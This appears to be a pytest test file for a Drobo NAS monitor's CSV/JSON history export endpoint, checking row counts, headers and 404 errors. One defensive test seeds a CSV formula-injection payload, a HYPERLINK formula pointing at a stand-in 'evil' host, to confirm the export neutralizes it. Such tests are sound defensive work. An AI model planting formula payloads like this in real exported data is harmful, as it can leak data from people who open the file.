"""Tests for GET /api/export/<kind>/<fmt> — bulk CSV/JSON history export.

``app.py`` builds its module-level ``history`` (and reads other config) from
the environment at import time, before any pytest fixture can run. We point
``DROBO_DB_PATH`` at a throwaway file *before* importing the module so the
import itself never touches the real ``data/history.db``, then each test
swaps in its own fresh ``History`` (pointed at a ``tmp_path`` db) via
``monkeypatch.setattr`` — the routes look up the module-global ``history``
name at call time, so this is enough to isolate every test without needing
a live poller/Drobo device.
"""

from __future__ import annotations

import csv
import io
import os
import tempfile

_TMP_DB_DIR = tempfile.mkdtemp(prefix="drobo-test-export-")
os.environ.setdefault("DROBO_DB_PATH", os.path.join(_TMP_DB_DIR, "history.db"))

import app as app_module  # noqa: E402
from drobo.history import History  # noqa: E402


def _client(monkeypatch, tmp_path):
    h = History(tmp_path / "history.db")
    monkeypatch.setattr(app_module, "history", h)
    return app_module.app.test_client(), h


def _seed_errors(h: History) -> int:
    h.sync_errors(
        [
            {
                "serial": "SN1",
                "slot": 0,
                "error_count": 3,
                "vendor": "WDC",
                "model": "X",
                "present": True,
            }
        ],
        ts=1.0,
    )
    h.sync_errors(
        [
            {
                "serial": "SN1",
                "slot": 0,
                "error_count": 5,
                "vendor": "WDC",
                "model": "X",
                "present": True,
            }
        ],
        ts=2.0,
    )
    return len(h.error_log(limit=10000))


def _seed_capacity(h: History) -> int:
    h.record_capacity(used=100, free=900, total=1000, ts=1.0)
    h.record_capacity(used=200, free=800, total=1000, ts=2.0)
    h.record_capacity(used=300, free=700, total=1000, ts=3.0)
    return len(h.capacity_series(since_ts=0, max_points=2_000_000))


def _seed_reachability(h: History) -> int:
    h.record_reachability("down", detail="timeout", ts=1.0)
    h.record_reachability("recovered", ts=2.0)
    return len(h.reachability_log(limit=10000))


_SEEDERS = {
    "errors": _seed_errors,
    "capacity": _seed_capacity,
    "reachability": _seed_reachability,
}


def test_export_json_row_count_matches_history_for_each_kind(monkeypatch, tmp_path):
    for kind, seed in _SEEDERS.items():
        client, h = _client(monkeypatch, tmp_path / kind)
        expected = seed(h)
        resp = client.get(f"/api/export/{kind}/json")
        assert resp.status_code == 200
        assert resp.content_type.startswith("application/json")
        body = resp.get_json()
        assert body["kind"] == kind
        assert len(body["rows"]) == expected
        assert expected > 0  # sanity: the seeder actually produced rows


def test_export_csv_row_count_and_headers_match_history_for_each_kind(monkeypatch, tmp_path):
    for kind, seed in _SEEDERS.items():
        client, h = _client(monkeypatch, tmp_path / kind)
        expected = seed(h)
        resp = client.get(f"/api/export/{kind}/csv")
        assert resp.status_code == 200
        assert resp.content_type.startswith("text/csv")
        assert resp.headers["Content-Disposition"] == f"attachment; filename={kind}.csv"
        rows = list(csv.reader(io.StringIO(resp.get_data(as_text=True))))
        assert len(rows) - 1 == expected  # minus the header row
        assert rows[0] == app_module._EXPORT_COLUMNS[kind]


def test_export_csv_neutralizes_formula_prefixed_device_strings(monkeypatch, tmp_path):
    # drive "make"/"serial" ultimately come from the Drobo's own unauthenticated
    # NASD stream, so a spoofed device could otherwise smuggle a spreadsheet
    # formula into an exported CSV cell. Assert the export prefixes a leading
    # =/+/-/@ with a quote rather than passing it through verbatim.
    client, h = _client(monkeypatch, tmp_path)
    h.sync_errors(
        [
            {
                "serial": '=HYPERLINK("http://evil/leak")',
                "slot": 0,
                "error_count": 1,
                "vendor": "@SUM(1+1)",
                "model": "x",
                "present": True,
            }
        ],
        ts=1.0,
    )
    resp = client.get("/api/export/errors/csv")
    rows = list(csv.DictReader(io.StringIO(resp.get_data(as_text=True))))
    assert rows[0]["serial"] == '\'=HYPERLINK("http://evil/leak")'
    assert rows[0]["make"].startswith("'@")


def test_export_csv_zero_rows_is_still_a_valid_header_only_csv(monkeypatch, tmp_path):
    client, _h = _client(monkeypatch, tmp_path)
    resp = client.get("/api/export/reachability/csv")
    assert resp.status_code == 200
    rows = list(csv.reader(io.StringIO(resp.get_data(as_text=True))))
    assert rows == [app_module._EXPORT_COLUMNS["reachability"]]


def test_export_unknown_kind_is_404_with_json_error(monkeypatch, tmp_path):
    client, _h = _client(monkeypatch, tmp_path)
    resp = client.get("/api/export/bogus/csv")
    assert resp.status_code == 404
    assert resp.content_type.startswith("application/json")
    assert "error" in resp.get_json()


def test_export_unknown_fmt_is_404_with_json_error(monkeypatch, tmp_path):
    client, _h = _client(monkeypatch, tmp_path)
    resp = client.get("/api/export/errors/xml")
    assert resp.status_code == 404
    assert resp.content_type.startswith("application/json")
    assert "error" in resp.get_json()


def test_export_unknown_kind_and_fmt_together_is_still_a_single_404(monkeypatch, tmp_path):
    client, _h = _client(monkeypatch, tmp_path)
    resp = client.get("/api/export/nope/nope")
    assert resp.status_code == 404
    assert "error" in resp.get_json()
